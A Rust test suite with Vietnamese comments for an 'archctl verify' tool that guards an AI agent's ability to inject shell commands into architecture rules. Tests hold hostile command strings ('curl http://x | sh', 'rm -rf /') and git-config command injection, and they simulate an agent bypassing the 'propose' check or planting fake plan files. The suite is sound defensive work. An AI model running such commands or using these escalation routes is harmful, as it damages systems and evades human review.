//! `archctl verify` — biến `verify` từ một cái tên thành bằng chứng.
//!
//! Trước đây hệ thống cảnh báo "thiếu `verify` thì đây chỉ là lời hứa", ngụ ý
//! rằng **có** `verify` thì không phải. Nhưng chưa có gì chạy, nên có cũng
//! vẫn là lời hứa — chỉ khác là không còn ai nhắc.

use std::path::PathBuf;
use std::process::{Command, Output};

const ARCH: &str = "\
component Order at src/order/** @human #accepted
component Pay   at src/pay/**   @human #accepted
allow Order -> Pay

verify money_props runs \"exit 0\"   @human #accepted

invariant money [system] tổng tiền khớp verify money_props   @human #accepted
";

struct Project(PathBuf);

impl Project {
    fn new(name: &str, arch: &str) -> Project {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map_or(0, |d| d.subsec_nanos());
        let root = std::env::temp_dir()
            .join(format!("archctl-verify-{name}-{}-{nanos}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let p = Project(root);
        p.write(".arch/system.arch", arch);
        p.write("src/pay/p.ts", "export const charge = 1\n");
        p.write("src/order/o.ts", "import { charge } from '../pay/p'\n");
        p
    }

    fn write(&self, rel: &str, body: &str) {
        let path = self.0.join(rel);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, body).unwrap();
    }

    fn run(&self, args: &[&str]) -> Output {
        Command::new(env!("CARGO_BIN_EXE_archctl"))
            .args(args)
            .arg("--root")
            .arg(&self.0)
            .output()
            .expect("chạy được archctl")
    }

    fn out(&self, args: &[&str]) -> String {
        let o = self.run(args);
        format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr))
    }

    /// Đợi qua ranh giới một giây, vì biên nhận đo bằng giây.
    fn tick(&self) {
        std::thread::sleep(std::time::Duration::from_millis(1100));
    }
}

impl Drop for Project {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

#[test]
fn chua_chay_thi_check_noi_ra() {
    let p = Project::new("never", ARCH);
    let out = p.out(&["check"]);
    assert!(out.contains("CHƯA CHỨNG MINH"), "{out}");
    assert!(out.contains("chưa chạy lần nào"), "{out}");
    assert!(out.contains("archctl verify money_props"), "phải nói cách sửa: {out}");
}

#[test]
fn chay_xong_thi_het_canh_bao() {
    let p = Project::new("ran", ARCH);
    assert!(p.run(&["verify", "--quiet"]).status.success());
    assert!(!p.out(&["check"]).contains("CHƯA CHỨNG MINH"), "{}", p.out(&["check"]));
    assert!(p.0.join(".arch/.verified").exists());
}

#[test]
fn lenh_hong_thi_bien_nhan_ghi_la_hong() {
    let p = Project::new("failed", &ARCH.replace("runs \"exit 0\"", "runs \"exit 3\""));
    assert!(!p.run(&["verify", "--quiet"]).status.success(), "verify phải báo hỏng");
    let out = p.out(&["check"]);
    assert!(out.contains("lần chạy gần nhất không đạt"), "{out}");
}

#[test]
fn sua_ma_thi_bien_nhan_het_hieu_luc() {
    // Một lần chạy đạt từ trước khi sửa mã không chứng minh được gì cho mã
    // hiện tại.
    let p = Project::new("codechange", ARCH);
    p.run(&["verify", "--quiet"]);
    p.tick();
    p.write("src/order/o.ts", "import { charge } from '../pay/p'\n// đổi\n");
    let out = p.out(&["check"]);
    assert!(out.contains("mã đã đổi sau lần chạy gần nhất"), "{out}");
}

#[test]
fn sua_luat_thi_bien_nhan_het_hieu_luc() {
    let p = Project::new("archchange", ARCH);
    p.run(&["verify", "--quiet"]);
    p.write(".arch/system.arch", &format!("{ARCH}deny Pay -> Order\n"));
    let out = p.out(&["check"]);
    assert!(out.contains("luật đã đổi sau lần chạy gần nhất"), "{out}");
}

#[test]
fn them_chu_thich_khong_lam_het_hieu_luc() {
    // `arch_hash` băm mô hình chứ không băm văn bản. Biên nhận hết hạn vì một
    // dòng chú thích là kêu sói, và người dùng sẽ học cách bỏ qua.
    let p = Project::new("comment", ARCH);
    p.run(&["verify", "--quiet"]);
    p.tick();
    p.write(".arch/system.arch", &format!("{ARCH}# ghi chú thêm\n"));
    assert!(!p.out(&["check"]).contains("CHƯA CHỨNG MINH"), "{}", p.out(&["check"]));
}

#[test]
fn chay_duoc_tung_cach_kiem_mot() {
    let arch = format!("{ARCH}verify khac runs \"exit 0\"  @human #accepted\n\
                        invariant time [system] nhanh verify khac  @human #accepted\n");
    let p = Project::new("named", &arch);
    p.run(&["verify", "money_props", "--quiet"]);
    let out = p.out(&["check"]);
    assert!(!out.contains("`money_props`"), "{out}");
    assert!(out.contains("`khac`"), "cái chưa chạy vẫn phải bị nhắc: {out}");
}

#[test]
fn verify_tro_toi_ten_chua_khai_bao_thi_bao_ra() {
    let arch = ARCH.replace("verify money_props runs \"exit 0\"   @human #accepted\n", "");
    let p = Project::new("dangling", &arch);
    let out = p.out(&["check"]);
    assert!(out.contains("chưa khai báo"), "{out}");
}

/// `accept` ghi thẳng đề xuất vào file luật, và `archctl verify` chạy lệnh
/// trong đó. Nếu agent đề xuất được một cách kiểm thì một lần duyệt vội là đủ
/// để nó tự chọn thứ chạy trên máy người dùng.
#[test]
fn agent_khong_de_xuat_duoc_mot_lenh_shell() {
    let p = Project::new("noshell", ARCH);
    let o = p.run(&["propose", "verify evil runs \"touch /tmp/pwned\"", "--reason", "thử"]);
    assert!(!o.status.success());
    let out = format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr));
    assert!(out.contains("lệnh shell"), "{out}");
    assert!(!p.0.join(".arch/proposals.arch").exists() ||
            !std::fs::read_to_string(p.0.join(".arch/proposals.arch")).unwrap().contains("evil"));
}

/// `check` chạy trong hook của agent sau mỗi lần sửa file. Nếu nó chạy lệnh
/// shell thì mọi ranh giới ở trên đều vô nghĩa.
#[test]
fn check_khong_bao_gio_chay_lenh() {
    let flag = std::env::temp_dir().join(format!("archctl-flag-{}", std::process::id()));
    let _ = std::fs::remove_file(&flag);
    let arch = ARCH.replace(
        "runs \"exit 0\"",
        &format!("runs \"touch {}\"", flag.display()),
    );
    let p = Project::new("nosideeffect", &arch);
    p.run(&["check"]);
    p.run(&["check", "--strict"]);
    assert!(!flag.exists(), "`check` đã chạy lệnh của verify");
    let _ = std::fs::remove_file(&flag);
}

#[test]
fn hai_cach_kiem_trung_ten_bi_bao() {
    // Cái thứ hai bị bỏ im lặng thì người viết tưởng lệnh của mình đang chạy.
    let p = Project::new("dup", &format!("{ARCH}verify money_props runs \"exit 9\"  @human #accepted\n"));
    let out = p.out(&["check"]);
    assert!(out.contains("trùng tên"), "{out}");
    assert!(!p.run(&["check"]).status.success(), "trùng tên là lỗi, không phải cảnh báo");
}

#[test]
fn lenh_chua_chu_runs_van_doc_dung() {
    let arch = ARCH.replace("runs \"exit 0\"", "runs \"sh -c 'echo runs ok'\"");
    let p = Project::new("runsword", &arch);
    assert!(p.run(&["verify", "--quiet"]).status.success(), "{}", p.out(&["verify"]));
}

#[test]
fn bien_nhan_bi_sua_tay_thanh_rac_khong_lam_sap() {
    let p = Project::new("garbage", ARCH);
    p.run(&["verify", "--quiet"]);
    p.write(".arch/.verified", "rác rưởi\nmoney_props\n\n###\n");
    let out = p.out(&["check"]);
    assert!(out.contains("chưa chạy lần nào"), "dòng hỏng phải bị bỏ qua: {out}");
}

/// `propose` chặn, nhưng `proposals.arch` là file **agent ghi** — và agent
/// chạy được shell, nên nó ghi thẳng vào đó mà chẳng cần đi qua `propose`.
/// Chỗ duy nhất kiểm được là ngay trước khi ghi vào file luật.
#[test]
fn agent_ghi_thang_proposals_roi_accept_cung_khong_qua_duoc() {
    let p = Project::new("escalate", ARCH);
    // Id đúng của nội dung, để chạm tới phép chặn lệnh shell chứ không dừng ở
    // phép đối chiếu id.
    let statement = "verify evil runs \"touch /tmp/archctl-pwn\"";
    let id = arch_core::protocol::proposal_id(arch_core::protocol::Intent::Rule, statement);
    p.write(".arch/proposals.arch", &format!("proposal {id} @ai 2026-10-03\n  rule {statement}\n  reason lách\n"));
    let o = p.run(&["accept", &id, "--reason", "duyệt vội"]);
    assert!(!o.status.success());
    let out = format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr));
    assert!(out.contains("lệnh shell"), "{out}");
    let law = std::fs::read_to_string(p.0.join(".arch/system.arch")).unwrap();
    assert!(!law.contains("evil"), "lệnh đã lọt vào file luật:\n{law}");
}

#[test]
fn chan_theo_cu_phap_chu_khong_theo_chuoi() {
    // Mỗi cách viết lách khác đi là một lần phải đoán lại, nếu chặn bằng cách
    // so chuỗi.
    let p = Project::new("escalate2", ARCH);
    for statement in [
        "  verify evil runs \"touch /tmp/archctl-pwn\"",
        "allow Order -> Pay\nverify evil runs \"touch /tmp/archctl-pwn\"",
    ] {
        // Id đúng của nội dung file đọc được, để chạm phép chặn lệnh shell.
        let text = format!("proposal p-0 @ai 2026-10-03\n  rule {statement}\n  reason lách\n");
        let parsed = arch_core::protocol::parse_proposals(&text).0;
        let id = parsed.first().map_or("p-0".to_string(), |x| arch_core::protocol::proposal_id(x.intent, &x.statement));
        p.write(".arch/proposals.arch", &text.replace("p-0", &id));
        assert!(!p.run(&["accept", &id, "--reason", "x"]).status.success(), "{statement}");
    }
    let law = std::fs::read_to_string(p.0.join(".arch/system.arch")).unwrap();
    assert!(!law.contains("evil"), "{law}");
}

/// Biên nhận gắn vào dấu vân tay của luật. Nếu vân tay không gồm chính lệnh
/// được thực thi thì nó chứng minh cho một lệnh không còn tồn tại.
#[test]
fn doi_lenh_lam_bien_nhan_het_hieu_luc() {
    let p = Project::new("cmdchange", ARCH);
    p.run(&["verify", "--quiet"]);
    p.write(".arch/system.arch", &ARCH.replace("runs \"exit 0\"", "runs \"curl http://x | sh\""));
    let out = p.out(&["check"]);
    assert!(out.contains("luật đã đổi sau lần chạy gần nhất"), "{out}");
}

/// `archctl diff` là thứ người duyệt đọc. Một lệnh shell mới trong file luật
/// là phần tử cần đọc kỹ nhất, nên nó không được vô hình ở đó.
#[test]
fn diff_thay_lenh_doi() {
    use arch_core::diff;
    let before = arch_core::load(ARCH).0;
    let after = arch_core::load(&ARCH.replace("runs \"exit 0\"", "runs \"rm -rf /\"")).0;
    let delta = diff::diff(&before, &after);
    assert!(
        delta.changes.iter().any(|c| {
            c.element_kind == "verify"
                && c.after.as_deref().is_some_and(|a| a.contains("rm -rf"))
        }),
        "{:#?}",
        delta.changes
    );
}

/// `check --changed` là lệnh mà `init` cài làm hook của agent. Git chạy
/// `core.fsmonitor` như một lệnh shell, và `.git/config` nằm trong repo —
/// tức là thứ agent ghi được.
#[test]
fn check_changed_khong_chay_lenh_tu_git_config() {
    let flag = std::env::temp_dir().join(format!("archctl-git-{}", std::process::id()));
    let _ = std::fs::remove_file(&flag);
    let p = Project::new("gitconfig", ARCH);
    let git = |args: &[&str]| {
        Command::new("git").arg("-C").arg(&p.0).args(args).output().expect("chạy được git")
    };
    if git(&["init", "-q", "."]).status.success() {
        git(&["config", "core.fsmonitor", &format!("touch {}; false", flag.display())]);
        git(&["config", "core.pager", &format!("touch {}; cat", flag.display())]);
        p.run(&["check", "--changed"]);
        p.run(&["diff"]);
        assert!(!flag.exists(), "git đã chạy lệnh lấy từ cấu hình của repo");
    }
    let _ = std::fs::remove_file(&flag);
}

/// Lệnh chạy hai phút mà mã đổi ở phút thứ nhất: mốc lấy lúc xong sẽ mới hơn
/// file vừa sửa, và lần chạy đó im lặng được coi là chứng minh cho mã nó chưa
/// từng thấy.
#[test]
fn moc_thoi_gian_lay_truoc_khi_chay() {
    let p = Project::new("timing", &ARCH.replace("runs \"exit 0\"", "runs \"sleep 2\""));
    let root = p.0.clone();
    let writer = std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_millis(900));
        std::fs::write(root.join("src/order/o.ts"), "// sửa giữa chừng\n").unwrap();
    });
    p.run(&["verify", "--quiet"]);
    writer.join().unwrap();
    let out = p.out(&["check"]);
    assert!(out.contains("mã đã đổi sau lần chạy gần nhất"), "{out}");
}

#[test]
fn ten_go_sai_thi_thoat_khac_khong() {
    let p = Project::new("typo", ARCH);
    assert!(!p.run(&["verify", "money_propz"]).status.success(), "một lỗi gõ trong CI = pass");
    assert!(
        !p.run(&["verify", "money_props", "khong_co"]).status.success(),
        "tên sai bị nuốt khi đi kèm tên đúng"
    );
}

#[test]
fn cach_kiem_chua_co_hieu_luc_thi_khong_chay() {
    // `check` không đòi nó, nên chạy nó là thực thi một lệnh không ai yêu cầu.
    let flag = std::env::temp_dir().join(format!("archctl-draft-{}", std::process::id()));
    let _ = std::fs::remove_file(&flag);
    let arch = format!(
        "component Order at src/order/** @human #accepted\n\
         verify nhap runs \"touch {}\"  @human #draft\n",
        flag.display()
    );
    let p = Project::new("draft", &arch);
    p.run(&["verify"]);
    assert!(!flag.exists(), "đã chạy một cách kiểm chưa có hiệu lực");
    let _ = std::fs::remove_file(&flag);
}

#[test]
fn json_co_du_moi_loai_canh_bao() {
    let p = Project::new("jsonfull", ARCH);
    let out = p.out(&["check", "--json"]);
    for field in ["unproven", "oversized", "ambiguous", "missing", "vacuous", "unresolved"] {
        assert!(out.contains(&format!("\"{field}\"")), "thiếu `{field}`: {out}");
    }
}

// Plan Terraform: biên nhận chỉ chứng nhận file mà chính lệnh ghi plan ghi ra
// (TM-57). Một file plan giả commit sẵn, lệnh không đụng tới, không được dùng.
const TF_ARCH: &str = "\
service Worker from tf:infra/module.ecs.aws_lambda_function.worker @human #accepted
service Db from tf:infra/aws_db_instance.main @human #accepted
verify tf_plan runs \"cp infra/real.json .arch/tf-plan.json\" @human #accepted
";

const TF_MAIN: &str = "resource \"aws_db_instance\" \"main\" {}\nmodule \"ecs\" {\n  source  = \"terraform-aws-modules/ecs/aws\"\n  db_host = aws_db_instance.main.address\n}\n";

fn tf_plan(edge: bool) -> String {
    let refs = if edge { r#"["var.db_host"]"# } else { "[]" };
    format!(
        r#"{{"configuration":{{"root_module":{{"resources":[{{"address":"aws_db_instance.main","mode":"managed","type":"aws_db_instance","name":"main","expressions":{{}}}}],
  "module_calls":{{"ecs":{{"source":"terraform-aws-modules/ecs/aws","expressions":{{"db_host":{{"references":["aws_db_instance.main.address"]}}}},
    "module":{{"resources":[{{"address":"aws_lambda_function.worker","mode":"managed","type":"aws_lambda_function","name":"worker",
      "expressions":{{"environment":[{{"variables":{{"references":{refs}}}}}]}}}}]}}}}}}}}}},
 "planned_values":{{"root_module":{{"resources":[{{"address":"aws_db_instance.main","values":{{}}}}],
   "child_modules":[{{"resources":[{{"address":"module.ecs.aws_lambda_function.worker","values":{{}}}}]}}]}}}}}}"#
    )
}

#[test]
fn plan_chi_duoc_chung_nhan_khi_chinh_lenh_ghi_ra() {
    let p = Project::new("tf-plan", TF_ARCH);
    p.write("infra/main.tf", TF_MAIN);
    p.write("infra/real.json", &tf_plan(true));
    // Chưa có plan: module registry chưa đọc được.
    assert!(p.out(&["check", "--strict"]).contains("registry"));
    assert!(p.out(&["verify", "tf_plan"]).contains("1/1 đạt"));
    let out = p.out(&["check", "--strict"]);
    assert!(out.contains("Worker -> Db"), "plan thật phải cho cạnh: {out}");
    assert!(!out.contains("registry"), "{out}");
    // `scan --plan` thấy đúng thứ `check` thấy; không cờ thì chỉ bộ đọc HCL.
    let with = p.out(&["scan", "--json", "--plan"]);
    assert!(with.contains("module.ecs.aws_lambda_function.worker"), "{with}");
    assert!(!p.out(&["scan", "--json"]).contains("module.ecs.aws_lambda_function.worker"));
    // Chạy lại với cùng nội dung plan: vẫn được chứng nhận (lệnh ghi lại file).
    p.tick();
    p.out(&["verify", "tf_plan"]);
    assert!(p.out(&["check", "--strict"]).contains("Worker -> Db"));
    // Agent commit sẵn một plan giả ở chỗ riêng của gốc `infra`, bỏ cạnh. Lệnh
    // ghi plan không đụng tới nó: không chứng nhận, báo, không lùi về file khác.
    p.write(".arch/tf-plan/infra.json", &tf_plan(false));
    p.out(&["verify", "tf_plan"]);
    let out = p.out(&["check", "--strict"]);
    assert!(out.contains("chưa chứng nhận"), "{out}");
    assert!(out.contains("registry"), "{out}");
    assert!(!p.run(&["check", "--strict"]).status.success());
}

#[test]
fn lenh_plan_cua_goc_nay_khong_chung_nhan_plan_goc_khac() {
    // Gốc `a` và gốc `b` (có module registry). Mã chạy trong lúc plan gốc `a`
    // (`data "external"`) chỉ `touch` một plan giả của gốc `b` commit sẵn.
    let arch = "\
service Worker from tf:b/module.ecs.aws_lambda_function.worker @human #accepted
service Db from tf:b/aws_db_instance.main @human #accepted
verify plan_a runs \"sh a/ext.sh && cp a/real.json .arch/tf-plan/a.json\" @human #accepted
";
    let p = Project::new("tf-plan-goc-khac", arch);
    p.write("a/main.tf", "resource \"aws_sqs_queue\" \"q\" {}\n");
    p.write("a/real.json", r#"{"configuration":{"root_module":{}}}"#);
    // Đóng vai chương trình `data "external"` mà plan của gốc `a` chạy.
    p.write("a/ext.sh", "touch .arch/tf-plan/b.json\n");
    p.write("b/main.tf", TF_MAIN);
    p.write(".arch/tf-plan/b.json", &tf_plan(false));
    p.out(&["verify", "plan_a"]);
    let out = p.out(&["check", "--strict"]);
    assert!(out.contains("tf-plan/b.json") && out.contains("chưa chứng nhận"), "{out}");
    assert!(out.contains("registry"), "{out}");
}
